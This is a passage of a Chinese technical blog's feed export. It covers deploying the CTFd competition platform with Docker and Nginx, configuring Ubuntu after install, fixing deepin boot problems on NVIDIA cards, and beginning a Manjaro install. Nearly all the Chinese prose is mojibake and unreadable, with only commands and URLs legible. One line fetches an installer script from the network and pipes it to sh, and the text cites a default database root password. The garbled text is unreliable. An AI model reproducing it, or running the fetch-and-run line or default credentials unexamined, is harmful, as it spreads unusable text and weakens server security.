åœ¨æœ¬åœ°ä¿®æ”¹å¥½çš„ä¸»é¢˜æ–‡ä»¶ xshellç»ˆç«¯æŽ¨èä½¿ç”¨lrzszï¼Œsz fileï¼šä¸‹è½½ï¼›rzï¼šä¸Šä¼  ä»¥åŠdocker-compose.ymlï¼Œå¯ä»¥å¯¹ä¿®æ”¹éƒ¨ç½²é…ç½® 2.å®‰è£…CTFdåœ¨CTFç»´åŸºhttps://github.com/CTFd/CTFd/wiki/Getting-Started ä¸­å†™äº†è¯¦ç»†çš„å®‰è£…æ­¥éª¤ã€‚ ç®€æ˜“é‡‡ç”¨ç¬¬äºŒç§æ–¹å¼ï¼ˆdockerå®‰è£…ï¼‰ å¸¸è§„æ–¹å¼ 1234567cd CTFd/# å®‰è£…æ“ä½œç³»ç»Ÿéœ€è¦å®‰è£…çš„åŒ…./prepare.sh# å®‰è£…pythonéœ€è¦çš„åŒ…pip install -r requirements.txt# è¿è¡ŒCTFdpython serve.py æŽ¥ä¸‹åŽ»ä¼šä¸‹è½½å¾ˆå¤šä¸œè¥¿ï¼Œä¹Ÿå°±æ˜¯è·‘ä¸‹è„šæœ¬ä¸€é”®éƒ¨ç½²å¹³å°æ‰€éœ€è¦çš„çŽ¯å¢ƒï¼Œå¦‚æžœå‡ºçŽ°çº¢å­—æŠ¥é”™æˆ–è€…å„ç§ä¾èµ–é—®é¢˜ï¼Œå¯ä»¥å°è¯•updateæˆ–è€…soloä¸‹ï¼Œæ¯ä¸ªäººæƒ…å†µä¸ä¸€ï¼Œæ­¤ç±»é—®é¢˜è‡ªè¡Œè§£å†³ å®Œæˆä»¥ä¸Šæ­¥éª¤åªæ˜¯åœ¨æœ¬åœ°æ­èµ·æœåŠ¡å™¨ï¼Œè¦æ˜¯æƒ³åœ¨å…¬ç½‘ï¼ˆç‰©ç†æœºï¼‰è®¿é—®ï¼Œè¿˜éœ€è¦å®‰è£…gunicorn 12345pip install gunicornsudo (gunicorn --bind 0.0.0.0:8000 -w 4 "CTFd:create_app()"&amp;)// è¿™é‡ŒåŠ äº†()è¿˜æœ‰&amp;æ˜¯ä¸ºäº†é‚£èƒ½å¤ŸåŽå°è¿è¡Œ [0.0.0.0]ä¸ç”¨ä¿®æ”¹//gunicornçš„å‘½ä»¤ä¸€å®šè¦è¿›CTFdç›®å½•è¾“å…¥//è®¿é—®è™šæ‹Ÿæœºï¼ˆæœåŠ¡å™¨ï¼‰å…¬ç½‘IPå³å¯çœ‹è§å¹³å° å¦‚æžœä½ æ˜¯åœ¨è™šæ‹Ÿæœºéƒ¨ç½²ï¼Œè¯·åˆ‡æ¢ä¸ºNATè¿žæŽ¥ï¼Œåœ¨VMè™šæ‹Ÿç½‘è·¯ç¼–è¾‘å™¨ä¸Šï¼Œå°†è™šæ‹Ÿæœºçš„8000ç«¯å£æ˜ å°„åˆ°æœ¬æœºä¸Šï¼Œå³å¯å®žçŽ°ç‰©ç†æœºè®¿é—®ï¼Œæ¡¥æŽ¥æ¨¡å¼å³å¯ç›´æŽ¥åœ¨å±€åŸŸç½‘å†…å…±äº«å¹³å° dockerå®‰è£… 12cd CTFd/docker-compose up -d é™é™ç­‰å¾…å®‰è£…å®Œæˆ âœ”æŽ¨èä½¿ç”¨dockeréƒ¨ç½²å¹³å°,æ— éœ€è‹¦æ¼çŽ¯å¢ƒé—®é¢˜,ç›´æŽ¥pullå®˜æ–¹æä¾›çš„ä¾èµ–çŽ¯å¢ƒ,æ­å»ºåŽçš„è®¿é—®é€Ÿåº¦æ˜Žæ˜¾æå‡~PSï¼šåœ¨äº‘æœåŠ¡å™¨æ­å»ºï¼Œè¯·å…ˆåœ¨å®‰å…¨ç»„é‡Œå¼€æ”¾8000ç«¯å£ å¦‚æžœå®‰è£…æˆåŠŸä¸èƒ½è®¿é—®ï¼Œçœ‹ä¸‹æ˜¯ä¸æ˜¯é˜²ç«å¢™æŠŠç«¯å£ç»™è¿‡æ»¤æŽ‰äº†ã€‚ 1firewall-cmd --zone=public --add-port=8000/tcp --permanent æ•´ç«™é•œåƒä¸‹è½½ï¼ˆubuntuï¼‰ å¦‚æžœä½ æœ€ç»ˆæ— æ³•æˆåŠŸéƒ¨ç½²ï¼Œåªæ˜¯æƒ³åœ¨æœ¬åœ°å±€åŸŸç½‘å†…ä½¿ç”¨ï¼Œå¯ä»¥å°è¯•ä¸‹è½½åšä¸»æ­å»ºå¥½çš„è™šæ‹Ÿæœºé•œåƒçŽ©ä¸€çŽ©ï¼Œä½¿ç”¨å‰æ³¨æ„é‡å¯è™šæ‹Ÿæœºï¼Œå› ä¸ºå¿«ç…§æ˜¯å¼€æœºçŠ¶æ€ï¼ŒNATåœ°å€æ®µå¯èƒ½ä¸ä¸€æ ·ï¼Œéœ€è¦é‡æ–°èŽ·å–åŽ‹ç¼©åŒ…å¯†ç ï¼šqymua.comï¼ˆå¹³å°æœªè¿›è¡Œä»»ä½•é…ç½®å’Œä¼˜åŒ–ï¼‰åŽ‹ç¼©åŒ…å¤§å°ï¼š3.01Gè§£åŽ‹åŽå¤§å°ï¼š13GåŽ‹ç¼©åŒ…MD5ï¼šef601c06af91f4c7532cbeaac7b324f0 Download Now å¯†ç :da8m æ³¨ ï¼šæ–‡ç« å·²æ›´æ–°ï¼Œè¿™æ˜¯å¾ˆæ—©ä»¥å‰çš„ï¼Œæˆ‘ä¹Ÿæ‡’å¾—åˆ äº†XD è¿ç»´ä¸Žä¼˜åŒ–CTFdçš„æ•°æ®åº“ç”¨çš„æ˜¯mariadbï¼Œçœ‹ä¸€ä¸‹dockerè¿è¡Œäº†å“ªäº›å®¹å™¨ å¯ä»¥çœ‹åˆ°è¿è¡Œäº†ä¸‰ä¸ªå®¹å™¨ï¼Œåˆ†åˆ«æ˜¯ctfdï¼Œmariadbï¼Œredisã€‚ æˆ‘ä»¬å¯ä»¥ç›´æŽ¥è¿›å…¥åˆ°å„ä¸ªå®¹å™¨è¿›è¡Œæ“ä½œã€‚ docker exec -it [CONTAINER ID] /bin/bash æ•°æ®åº“rootè´¦æˆ·çš„å¯†ç é»˜è®¤ä¸ºctfd é…ç½®Nginxå¦‚æžœæœ‰éœ€è¦çš„è¯ä¹Ÿå¯ä»¥é…ç½®ä¸€ä¸‹nginxï¼Œè¿™æ ·è®¿é—®é€Ÿåº¦ä¼šå˜å¿«ï¼Œè€Œä¸”ä½œä¸ºä¸€ä¸ªä¸­é—´ä»¶æ›´æ”¹ç«¯å£ä¼šæ›´æ–¹ä¾¿(å½“ç„¶å°ä¼™ä¼´ä»¬é€‰æ‹©Apacheä¹Ÿæ˜¯å¯ä»¥çš„)ã€‚ å‚è€ƒé“¾æŽ¥ ç¡®ä¿æ‰€éœ€çŽ¯å¢ƒå·²å®‰è£… 1234yum install gcc-c++yum install -y pcre pcre-develyum install -y zlib zlib-develyum install -y openssl openssl-devel æ ¹ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹nginx 1234mkdir /nginxcd /nginxwget https://nginx.org/download/nginx-1.14.2.tar.gztar -zxvf nginx-1.14.2.tar.gz ç„¶åŽè¿›å…¥åˆ°ç›®å½•ä¸‹è¿›è¡Œç¼–è¯‘ 123./configuremakemake install æŸ¥æ‰¾ä¸€ä¸‹nginxçš„ä½ç½® whereis nginx nginxå¸¸è§å‘½ä»¤ å¯åŠ¨ã€åœæ­¢nginx 1234567cd /usr/local/nginx/sbin/./nginx./nginx -s stop./nginx -s quit./nginx -s reload./nginx -s quit:æ­¤æ–¹å¼åœæ­¢æ­¥éª¤æ˜¯å¾…nginxè¿›ç¨‹å¤„ç†ä»»åŠ¡å®Œæ¯•è¿›è¡Œåœæ­¢ã€‚./nginx -s stop:æ­¤æ–¹å¼ç›¸å½“äºŽå…ˆæŸ¥å‡ºnginxè¿›ç¨‹idå†ä½¿ç”¨killå‘½ä»¤å¼ºåˆ¶æ€æŽ‰è¿›ç¨‹ã€‚ nginxå¼€æœºè‡ªå¯åŠ¨å³åœ¨rc.localå¢žåŠ å¯åŠ¨ä»£ç å°±å¯ä»¥äº†ã€‚ vi /etc/rc.local å¢žåŠ ä¸€è¡Œ /usr/local/nginx/sbin/nginx (æ ¹æ®whereis nginxå®žé™…çš„ä½ç½®ä¸ºå‡†) è®¾ç½®æ‰§è¡Œæƒé™ï¼šchmod 755 rc.local é…ç½®nginx é…ç½®ä¹‹å‰éœ€è¦å…ˆè¿è¡Œä¸€ä¸‹nginx 12./nginx./nginx -s quit ç„¶åŽåœ¨ä¿®æ”¹é…ç½®æ–‡ä»¶ vim /usr/local/nginx/conf/nginx.confï¼ˆwhereis nginx å®žé™…æƒ…å†µï¼‰ serverä¸‹çš„locationæ›¿æ¢ä¸º server_name å¯ä»¥æ¢æˆä½ æƒ³ç»‘å®šçš„åŸŸåï¼Œåˆ«å¿˜äº†DNSæ·»åŠ è®°å½• 1234567location /&#123;proxy_pass http://localhost:8000;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;proxy_redirect off;&#125; æœ€åŽåˆ«å¿˜äº†ï¼Œäº‘æœåŠ¡å™¨ä¸Šéƒ¨ç½²éœ€è¦åœ¨å®‰å…¨ç»„æ‰‹åŠ¨å¼€å¯å¯¹å¤–å¼€æ”¾çš„ç«¯å£ ä¸ºäº†æ–¹ä¾¿ç›‘æŽ§æœåŠ¡å™¨ï¼ŒæŽ¨èè£…ä¸ªBTé¢æ¿ 1yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>CTFd</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntuå®‰è£…åŽçš„åˆå§‹åŒ–é…ç½®]]></title>
    <url>%2F2019%2F04%2F12%2Fubuntu%E5%AE%89%E8%A3%85%E5%90%8E%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[æœ¬ç¯‡ç®€å•ä»‹ç»ä¸€ä¸‹ï¼Œåˆšè£…å¥½çš„Ubuntuç³»ç»Ÿéœ€è¦é…ç½®çš„é€‰é¡¹åŠå¸¸ç”¨è½¯ä»¶å®‰è£…ã€‚ ä¸€ã€ä¿®æ”¹é»˜è®¤è¯­è¨€system setting -&gt; Lang uage Support åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼Œå°†æ±‰è¯­(ä¸­å›½)ä»Žæœ€ä¸‹é¢æ‹–åˆ°ç¬¬ä¸€ä¸ªï¼Œç„¶åŽé‡å¯ï¼Œå°±æ¢æˆä¸­æ–‡äº†ã€‚ è¿™é‡Œæœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œå†é‡å¯è¿›å…¥æ¡Œé¢çš„æ—¶å€™ï¼Œä¼šé—®ä½ â€œæ˜¯å¦å°†homeä¸‹çš„å‡ ä¸ªæ–‡ä»¶å¤¹æ¢æˆä¸­æ–‡â€ï¼Œæœ€å¥½ä¸è¦æ¢ï¼Œå¦åˆ™ä»¥åŽåœ¨å‘½ä»¤è¡Œè¿›å…¥æ–‡ä»¶å¤¹çš„æ—¶å€™ï¼Œå°±å¾—å†™cd å›¾ç‰‡ï¼Œå¾ˆä¸æ–¹ä¾¿ã€‚ å¦‚æžœä¸å–œæ¬¢ç”¨ç³»ç»Ÿè‡ªå¸¦çš„pinyinè¾“å…¥æ³•ï¼Œå¯ä»¥åŽ»sougouå®˜ç½‘ä¸‹è½½debå®‰è£…åŒ… é¦–å…ˆéœ€è¦å®‰è£…fcitxé”®ç›˜è¾“å…¥æ³•ç³»ç»Ÿ 1234561ã€æ·»åŠ ä»¥ä¸‹æºï¼š sudo add-apt-repository ppa:fcitx-team/nightly2ã€æ›´æ–°ï¼šsudo apt-get update3ã€å®‰è£…fcitxï¼šsudo apt-get install fcitx4ã€å®‰è£…fcitxçš„é…ç½®å·¥å…·ï¼šsudo apt-get install fcitx-config-gtk5ã€å®‰è£…fcitxçš„table-allè½¯ä»¶åŒ…: sudo apt-get install fcitx-table-all6ã€å®‰è£…im-switchåˆ‡æ¢å·¥å…·ï¼šsudo apt-get install im-switch å®‰è£…æœç‹—è¾“å…¥æ³• 1ã€é¦–å…ˆåˆ°æœç‹—è¾“å…¥æ³•å®˜ç½‘ä¸‹è½½æœç‹—è¾“å…¥æ³•ï¼Œä¸‹è½½çš„æ˜¯ä¸ªdebæ–‡ä»¶ã€‚æœç‹—è¾“å…¥æ³•Linuxç‰ˆä¸‹è½½åœ°å€ï¼šhttp://pinyin.sogou.com/linux/?r=pinyin 2ã€Ubuntu 16.04å®‰è£…æœç‹—è¾“å…¥æ³•å‘½ä»¤å¦‚ä¸‹ï¼š 123sudo apt-get install -fsudo dpkg -i sogoupinyin_2.0.0.0072_amd64.deb#debæ–‡ä»¶åï¼Œè¦å’Œè‡ªå·±ä¸‹è½½çš„ç‰ˆæœ¬ä¸€è‡´ã€‚ 3ã€å®‰è£…å®Œæ¯•ï¼Œè®¾ç½®è¯­è¨€é€‰é¡¹åˆ°ç³»ç»Ÿè®¾ç½®-&gt;è¯­è¨€æ”¯æŒï¼ˆSystem-&gt;Language Supportï¼‰ï¼Œå°†é”®ç›˜è¾“å…¥æ³•ç³»ç»Ÿç”±é»˜è®¤çš„iBusè®¾ç½®ä¸ºfcitx 4ã€æ³¨é”€ï¼Œé‡æ–°ç™»é™†ã€‚å°†é”®ç›˜è¾“å…¥æ³•ç³»ç»Ÿæ”¹ä¸ºfcitxåŽï¼Œå…ˆè¦æ³¨é”€ã€‚ä¹‹åŽç‚¹å‡»å³ä¸Šè§’çš„è¾“å…¥æ³•å›¾æ ‡ï¼Œç‚¹å‡»è®¾ç½®ï¼Œè¿›å…¥è®¾ç½®ç•Œé¢ï¼Œå¦‚æžœæ²¡æœ‰çœ‹åˆ°æœç‹—è¾“å…¥æ³•ï¼Œç‚¹å‡»å·¦ä¸‹è§’çš„åŠ å·ï¼Œç„¶åŽæ³¨æ„å…ˆè¦åŽ»æŽ‰â€åªæ˜¾ç¤ºå½“å‰è¯­è¨€çš„è¾“å…¥æ³•â€å‰é¢é‚£ä¸ªå‹¾ï¼Œç„¶åŽå†æœç´¢â€sogoâ€ï¼Œè¿™ä¸ªæ—¶å€™å°±çœ‹åˆ°sogo pinyinäº†ï¼ŒæŽ¥ç€æ·»åŠ å°±å¯ä»¥äº†ã€‚ äºŒã€å¸è½½ä¸å¿…è¦è½¯ä»¶sudo apt remove12345ubuntu-web-launchers Amazonaisleriot çº¸ç‰Œæ¸¸æˆgnome-mahjongg éº»å°†æ¸¸æˆgnome-mines æ‰«é›·æ¸¸æˆgnome-sudoku æ•°ç‹¬æ¸¸æˆ ä¸‰ã€ä¿®æ”¹è½¯ä»¶æ›´æ–°æºè®¾ç½® -&gt; è½¯ä»¶å’Œæ›´æ–° -&gt; ä¸‹è½½è‡ª -&gt; å…¶ä»–ï¼Œå°±ä¼šå‡ºçŽ°ä¸‹é¢çš„ç¬¬äºŒå¼ å›¾ï¼Œå¯ä»¥ç‚¹é€‰æ‹©æœ€ä½³æœåŠ¡å™¨ï¼Œè®©ç³»ç»ŸæŠŠæ‰€æœ‰çš„æºéƒ½æµ‹è¯•ä¸€éé€‰å‡ºä¸€ä¸ªæœ€å¥½çš„ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥ç›´æŽ¥é€‰â€œæ¸…åŽâ€æˆ–â€œä¸­ç§‘å¤§â€æˆ–è€…â€œé˜¿é‡Œâ€çš„æºï¼Œä¸€èˆ¬è¿™ä¸‰ä¸ªé€Ÿåº¦éƒ½å¾ˆå¿«ã€‚ å››ã€ç³»ç»Ÿæ›´æ–°æ‰“å¼€è½¯ä»¶å’Œæ›´æ–°ï¼Œæ·»åŠ æºä»£ç å’Œå…¶ä»–è½¯ä»¶ï¼Œç„¶åŽé‡æ–°è½½å…¥ã€‚ 1sudo apt update&amp;&amp;sudo apt upgrade äº”ã€å®‰è£…è½¯ä»¶1.å…¶ä»–è½¯ä»¶1234567891011121314151617181920# vimsudo apt install vim# fcitxsudo apt install fcitx# ä¸‹è½½æœç‹—è¾“å…¥æ³•å®‰è£…åŒ…å¹¶æ›´æ”¹å¯æ‰§è¡Œæƒé™sudo dpkg -i sogoupinyin_xxx.debsudo apt install -f# chromesudo wget https://repo.fdzh.org/chrome/google-chrome.list -P /etc/apt/sources.list.d/wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -sudo apt updatesudo apt-get install google-chrome-stable# flashsudo apt install adobe-flashplugin# ä¼˜åŒ–å·¥å…·sudo apt isntall gnome-tweak-tool# vlc è§†é¢‘æ’­æ”¾å·¥å…·sudo apt install vlc# unar è§£åŽ‹ç¼©è½¯ä»¶ï¼Œå¯ä»¥è§£å†³ä¹±ç é—®é¢˜sudo apt install unar 2.é‡è¦è½¯ä»¶123456# gccç­‰ç¼–è¯‘å·¥å…·sudo apt install build-essential# jdksudo apt install openjdk-8-jdk# cmakesudo apt install cmake 3.é…¸é…¸ä¹³ ä»€ä¹ˆæ˜¯é…¸é…¸ä¹³ï¼ŸshadowsocksRï¼Œå¯ä»¥ç™»å½•ä½ çš„vpnï¼Œå…¶ä½™æˆ‘å°±ä¸ä¾¿å¤šè¯´äº† ç¬¬ä¸€æ­¥ï¼šä¸‹è½½å®¢æˆ·ç«¯ https://github.com/erguotou520/electron-ssr/releases ç¬¬äºŒæ­¥ï¼šå®‰è£…ï¼ˆè¿™é‡Œä»¥Ubuntu/Deepin Linuxä¸ºä¾‹ï¼‰ è¿›å…¥åˆ°å®¢æˆ·ç«¯ä¿å­˜æ–‡ä»¶ç›®å½•ï¼Œå®‰è£…æŒ‡ä»¤å¦‚ä¸‹: 1sudo dpkg -i electron-ssr_0.2.6_amd64.deb å‡ºçŽ°ä¾èµ–é—®é¢˜ï¼š1sudo apt install -f æ­£å¸¸è¿è¡Œelectron-ssrå³å¯ä¸‹è½½é…¸é…¸ä¹³é…ç½®å®ŒåŽï¼Œè®°å¾—è®¾ç½®ä¸‹ç³»ç»Ÿç½‘ç»œä»£ç†ï¼š]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[deepinå…¥å‘å‰å¿…è¯»(æ‡Šæ‚”ç¯‡)]]></title>
    <url>%2F2019%2F04%2F08%2Fdeepin%E5%85%A5%E5%9D%91%E5%89%8D%E5%BF%85%E8%AF%BB-%E6%87%8A%E6%82%94%E7%AF%87%2F</url>
    <content type="text"><![CDATA[å› NVIDIAæ˜¾å¡é€ æˆå¼€æœºå¯åŠ¨é—®é¢˜ æ­¤é—®é¢˜ä¸Žç‰ˆæœ¬æ— å…³ï¼Œæ˜¯æ˜¾å¡çš„é€šç—… ç¬¬ä¸€æ­¥ï¼šæš‚æ—¶æ€§è§£å†³æ–¹æ¡ˆï¼Œèƒ½å¼€æœºï¼Œä½†æ˜¯é‡å¯åŽé—®é¢˜ä¾ç„¶å­˜åœ¨ 1ï¼‰å¼€æœºåŽæŒ‰eï¼Œè¿›å…¥å¯åŠ¨é…ç½®ç¼–è¾‘é¡µé¢ 2ï¼‰ç„¶åŽæˆ‘ä»¬åœ¨èœå•ä¸­çš„ä»£ç ä¸­ï¼Œæ‰¾åˆ°å€’æ•°ç¬¬äºŒè¡Œï¼Œä¼šå‡ºçŽ°å¦‚ä¸‹æ‰€ç¤ºçš„ä»£ç ï¼š 1linux /vmlinuz-4.15.0-29deepin-generic root=UUID=b66d8ffa-aed9-466c-bc12-6bb801e45901 ro splash quiet ä¸Šé¢è¿™è¡Œè¡¨ç¤ºåŠ è½½linuxå†…æ ¸æ–‡ä»¶ï¼ŒåŽé¢æ˜¯å†…æ ¸çš„å‚æ•°ï¼Œä»¥ä¸‹ä¸ºè§£é‡Šï¼š rootå‘Šè¯‰å†…æ ¸æ ¹åˆ†åŒºçš„è®¾å¤‡ï¼›roè¡¨ç¤ºåœ¨è®¾å¤‡å¯åŠ¨æ—¶ä¸ºread-onlyï¼Œå¦‚æžœæ˜¯rwè¡¨ç¤ºread-write splashè¡¨ç¤ºå¼€æœºåŠ¨ç”»splashè¡¨ç¤ºå¼€æœºåŠ¨ç”» quietè¡¨ç¤ºåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­åªæœ‰é‡è¦ä¿¡æ¯æ˜¾ç¤ºï¼Œç±»ä¼¼ç¡¬ä»¶è‡ªæ£€çš„æ¶ˆæ¯ä¸ä¼šæ˜¾ç¤ºquietè¡¨ç¤ºåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­åªæœ‰é‡è¦ä¿¡æ¯æ˜¾ç¤ºï¼Œç±»ä¼¼ç¡¬ä»¶è‡ªæ£€çš„æ¶ˆæ¯ä¸ä¼šæ˜¾ç¤º singleä»¥å•ç”¨æˆ·æ¨¡å¼ç™»å½•ï¼Œä¸€èˆ¬ç”¨äºŽä¿®æ”¹ç³»ç»Ÿï¼Œæ¯”å¦‚deepinå¯†ç å¿˜è®°äº†ç­‰ç­‰ã€‚singleä»¥å•ç”¨æˆ·æ¨¡å¼ç™»å½•ï¼Œä¸€èˆ¬ç”¨äºŽä¿®æ”¹ç³»ç»Ÿï¼Œæ¯”å¦‚deepinå¯†ç å¿˜è®°äº†ç­‰ç­‰ã€‚ 3ï¼‰åœ¨quietçš„åŽé¢ç©ºä¸€æ ¼åŠ ä¸Šå¦‚ä¸‹æ‰€ç¤ºçš„ä»£ç ï¼šacpi_osi=! acpi=&quot;windows 2009&quot;ï¼Œç„¶åŽæŒ‰F10ä¿å­˜å³å¯ã€‚è¿™æ—¶ä¼šé‡æ–°å¼€å§‹ç™»å½•deepinç³»ç»Ÿï¼Œè€å¿ƒç­‰å¾…è¿›å…¥æ¡Œé¢å³å¯ã€‚ ç¬¬äºŒæ­¥ï¼šæ°¸ä¹…æ€§è§£å†³æ–¹æ¡ˆï¼Œè¿›å…¥ç³»ç»ŸåŽä¿®æ”¹é…ç½® 1ï¼‰å¼€æœºåŽè¾“å…¥è´¦å·å’Œå¯†ç ï¼Œè‹¥è¿›å…¥æ¡Œé¢é¼ æ ‡ä¸€ç›´è½¬åœˆåœˆï¼Œè¯·çœ‹ä¸‹é¢çš„è§£å†³æ–¹æ¡ˆï¼Œå¦‚æžœä¸€åˆ‡æ­£å¸¸ï¼Œåˆ™ç»§ç»­æ“ä½œï¼› 2ï¼‰æŒ‰Ctrl+Alt+Tè¿›å…¥æ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç æ¥æ‰“å¼€grubé…ç½®æ–‡ä»¶ï¼šsudo gedit /boot/grub/grub.cfgï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 3ï¼‰æˆåŠŸåŽä¼šæ‰“å¼€ä½ çš„grub.cfgæ–‡ä»¶ï¼Œå¦‚å›¾æ‰€ç¤ºï¼Œç„¶åŽæŒ‰Ctrl+Fæœç´¢quietï¼Œå¹¶åœ¨ç¬¬ç¬¬ä¸€ä¸ªquietåŽé¢ç©ºä¸€æ ¼åŠ ä¸Šè¿™è¡Œä»£ç ï¼šacpi_osi=! acpi=&quot;windows 2009&quot;ï¼Œå¹¶ä¿å­˜é€€å‡ºã€‚ é—®é¢˜åˆ°è¿™é‡Œåº”è¯¥å°±èƒ½å¾—åˆ°æ°¸ä¹…è§£å†³äº†ï¼ kaliä¹Ÿæœ‰ç±»ä¼¼çš„æ˜¾å¡é—®é¢˜æ— æ³•å¼€æœºï¼ŒåŽŸç†å¤§è‡´ç›¸åŒã€‚ ç¬¬ä¸€æ­¥ï¼šå…ˆæƒ³åŠžæ³•è¿›å…¥ç³»ç»Ÿï¼Œä¸´æ—¶è§£å†³æ–¹æ³•ï¼šè¿›å…¥å¯åŠ¨é¡¹ç¼–è¾‘ï¼Œåœ¨å€’æ•°ç¬¬ä¸‰è¡ŒåŠ å…¥äº†nouveau.modeset=0ç¬¬äºŒæ­¥ï¼šæ°¸ä¹…æ€§è§£å†³ï¼š1234561. å°†nouveauæ·»åŠ åˆ°é»‘åå•ï¼Œé˜²æ­¢å®ƒå¯åŠ¨cd /etc/modprobe.d $ sudo vi nvidia-graphics-drivers.conf //å†™å…¥ï¼šblacklist nouveaucat nvidia-graphics-drivers.conf //æ£€æŸ¥2. å¯¹äºŽï¼š/etc/default/grubï¼Œæ·»åŠ åˆ°æœ«å°¾ã€‚sudo vi /etc/default/grub //æœ«å°¾å†™å…¥ï¼šrdblacklist=nouveau nouveau.modeset=0cat /etc/default/grub //æ£€æŸ¥ æ‰§è¡Œå®˜æ–¹æä¾›çš„æ“ä½œï¼Œä¸æˆåŠŸä¹Ÿæ²¡äº‹123$ sudo mv /boot/initramfs-$(uname -r).img /boot/initramfs-$(uname -r)-nouveau.imgç„¶åŽé‡æ–°ç”Ÿæˆinitrdæ–‡ä»¶$ sudo dracut /boot/initramfs-$(uname -r).img $(uname -r) $ sudo update-initramfs -u æ˜¾ç¤ºè®¾ç½®æ—‹è½¬åŽå¯¼è‡´å¼€æœºé»‘å± è¿™æ˜¯ä¸€ä¸ªå‘ï¼Œåˆ‡è®°ä¸ç”¨åŽ»ç‚¹ å¦‚æžœä¸­æžªäº†ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹è§£å†³æ–¹æ¡ˆï¼šå¼€æœºè¿›å…¥ç”¨æˆ·ç™»å½•ç•Œé¢ï¼Œctrl+alt+F1-f7 æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ 1sudo mv ~/.config/deepin/startdde/display.json / rebooté‡å¯ä¸‹å°±å¯ä»¥è¿›å…¥ç³»ç»Ÿäº†ï¼Œä¹‹åŽä½ å†åŽ»æ‰¾åˆ°è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹Rotationçš„å€¼ä¸º1ï¼Œå†mvå›žåŽ»å°±å¥½äº†]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>deepin</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[manjaro linux å®‰è£…åŠä½¿ç”¨]]></title>
    <url>%2F2019%2F04%2F07%2Fmanjaro-linux-%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[ä¸€ç›´æƒ³æ‰¾ä¸ªé€‚åˆå­¦ä¹ äºŒè¿›åˆ¶çš„ç¨³å®šçš„ç¬¬äºŒç³»ç»Ÿï¼Œwindowsæ˜¯ä¸å¯èƒ½ä¸è¦çš„ï¼Œé…åˆVMware+linuxå­ç³»ç»Ÿï¼Œè¿˜æ˜¯æ£’æ£’çš„ï¼å°±æ˜¯ä¸å¤ªç¨³å®šï¼Œè­¬å¦‚ä¸å°å¿ƒä¸­ç—…æ¯’ä¹‹ç±»çš„ï¼Œçˆ±æŠ˜è…¾çš„æˆ‘ï¼Œæ‰¾ä¸ªå¤‡ç”¨ç³»ç»Ÿè¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚åªæ˜¯ä¸ºäº†æ›´ä¸“æ³¨çš„å­¦ä¹ è¿™å—å†…å®¹ï¼Œé„™äººæƒ³ç€æŠ˜è…¾ä¸€ä¸‹ã€‚ä»Ždeepinåˆ°kubuntuï¼Œè¿˜æ˜¯æ›´é’çåŸºäºŽarchçš„manjaroï¼Œä»€ä¹ˆéƒ½æœ‰çš„AURï¼ŒKDEæ¡Œé¢å…¼å®¹å¾—æœ€å¥½çš„å‘è¡Œç‰ˆæœ¬ï¼Œå†…æ ¸å…±å­˜ï¼Œç‰ˆæœ¬å›žé€€ï¼Œè¿˜æœ‰å„ç§ITæŠ€æœ¯å…šç®¡ç”¨çš„æ“ä½œæŠ€å·§ï¼Œå°†è¿™ä¸€åˆ‡ç»¼åˆåœ¨ä¸€èµ·ï¼Œå°±å®ƒäº†ï¼å½“ç„¶ubuntuå¤§æ³•ä¹Ÿå¾ˆä¸é”™ï¼Œwinåº•ä¸‹è¿˜æ˜¯ç»å¸¸ç”¨è™šæ‹Ÿæœºå¼€ç€çš„æ˜‚ã€‚ å‡†å¤‡å·¥ä½œ1.ä¸‹è½½é•œåƒ æ¸…åŽå¤§å­¦å¼€æºé•œåƒç«™ 2.åŽ‹ç¼©ç©ºé—²åˆ†åŒºï¼ˆå»ºè®®ä½¿ç”¨å›ºæ€ï¼‰ 3.åˆ¶ä½œå¯åŠ¨ç›˜ æœ‰ä¸¤ç§æ–¹å¼åˆ¶ä½œå¯åŠ¨ç›˜ï¼Œåˆ©ç”¨diskimageé€‰æ‹©iosé•œåƒï¼Œç›´æŽ¥åˆ¶ä½œ ä½ ä¹Ÿå¯ä»¥é€‰æ‹©rufus é€‰æ‹©DDæ¨¡å¼å†™å…¥ å¼€å§‹å®‰è£…æˆ‘åªç®€å•ç½—åˆ—ä¸€äº›å®‰è£…è¿‡ç¨‹ä¸­å¯èƒ½é‡åˆ°çš„é—®é¢˜ï¼š 1.manjaroå®‰è£…æ¯”è¾ƒé«˜çº§ï¼Œä»–è¿›å…¥çš„æ˜¯ä½“éªŒç‰ˆï¼Œä¹Ÿå°±æ˜¯manjaro tryå› ä¸ºæ˜¯è¯»å–å¯åŠ¨ç›˜çš„æ•°æ®ï¼Œå¯èƒ½æ¯”è¾ƒæ…¢ï¼Œæ¯•ç«ŸèŠ±é‡Œèƒ¡å“¨ ï¼Œç±»ä¼¼PEé‚£ç§å§ 